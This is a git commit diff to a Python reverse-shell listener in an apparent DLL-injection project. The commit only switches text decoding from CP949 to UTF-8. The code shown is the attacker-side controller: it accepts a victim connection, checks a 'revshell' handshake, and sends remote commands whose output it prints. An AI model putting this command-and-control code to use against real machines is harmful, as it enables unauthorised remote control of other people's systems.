948616ba44cd8bdc233bdb7fc14cab2b0a0a5d0f
yjparkk <64149898+yjparkk@users.noreply.github.com>
2023-08-04 14:53:29 +0900

    Update revshell.py
    인코딩 오류 해결

--- dll_injection/revshell.py
+++ dll_injection/revshell.py
@@ -12,7 +12,7 @@ def receive(client):
         connection = select.select([client], [], [], 0.5)
         if (connection[0]):
             data = client.recv(4096)
-            out += data.decode('CP949')
+            out += data.decode(encoding="utf-8", errors="ignore")
         else:
             break
 
@@ -24,7 +24,7 @@ sock.listen(5)
 
 client, addr = sock.accept()
 
-out = client.recv(1024).decode()
+out = client.recv(1024).decode(encoding="utf-8", errors="ignore")
 
 if (out != "revshell"):
     print("[!] Incoming protocol is not a reverse shell. Exiting.")
@@ -37,13 +37,13 @@ while True:
     request = cmd + ("0" * (1024 - len(cmd)))
 
     if (cmd == "shut"):
-        client.send(request.encode())
+        client.send(request.encode("utf-8"))
         print("[*] Closing remote socket...")
         exit(0)
     elif (cmd == "clear"):
         os.system("clear")
     else:
-        client.send(request.encode())
+        client.send(request.encode("utf-8"))
         t = threading.Thread(target=receive, args=(client,))
         t.start()
         time.sleep(1)
